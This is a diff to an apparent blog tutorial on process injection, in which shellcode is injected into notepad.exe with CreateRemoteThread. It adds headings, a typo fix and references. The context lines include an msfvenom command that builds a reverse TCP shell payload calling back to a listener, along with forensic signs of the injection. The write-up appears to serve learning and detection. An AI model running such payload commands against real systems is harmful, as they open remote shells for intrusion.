@@ -8,6 +8,8 @@ Code Injection is a process to inject code into another running process.
 
 In this article, We are gonna focus on injecting shellcode using CreateRemoteThread API.
 
+## Generating Shellcode
+
 First off, Let's use Metasploit to generate our malicious shellcode. It's a reverse tcp shell.
 
 {% code overflow="wrap" %}
@@ -21,6 +23,8 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.3 LPORT=3333 -f c -b \x00
 <figure><img src="../../.gitbook/assets/msfvenom_Shellcode.png" alt=""><figcaption></figcaption></figure>
 
 </div>
+
+## Executing Shellcode
 
 Now our C++ code to inject and execute this shellcode into a process by following steps:
 
@@ -144,7 +148,9 @@ We received the reverse shell on our Netcat listener and have remote access to o
 
 We can see `ShellcodeInj.exe` created a new process `cmd.exe` under `notepad.exe`
 
-Upon further analysis of notepad.exe, we can see the `ws2_32.dll` module loaded in the module section, which is typically not loaded under normal circumstances for notepad. This module handles socket management, indicating potential abnormal activity within the process.
+## Analysing the injected Process
+
+Upon further analysis of `notepad.exe`, we can see the `ws2_32.dll` module loaded in the module section, which is typically not loaded under normal circumstances for notepad. This module handles socket management, indicating potential abnormal activity within the process.
 
 <figure><img src="../../.gitbook/assets/modules (1).png" alt=""><figcaption></figcaption></figure>
 
@@ -152,4 +158,14 @@ Also on checking the `memory` tab, we can see, the `ws2_32.dll` loaded, and havi
 
 <figure><img src="../../.gitbook/assets/memory.png" alt=""><figcaption></figcaption></figure>
 
-Hene, we successfully injected the shellcode in target process.
+Hence, we successfully injected the shellcode in target process. That's all for this blog.&#x20;
+
+
+
+<figure><img src="http://www.reactiongifs.com/r/2012/06/homer_lurking.gif" alt=""><figcaption></figcaption></figure>
+
+## References
+
+{% embed url="https://0xpat.github.io/Malware_development_part_1/" %}
+
+{% embed url="https://www.ired.team/offensive-security/code-injection-process-injection/process-injection" %}
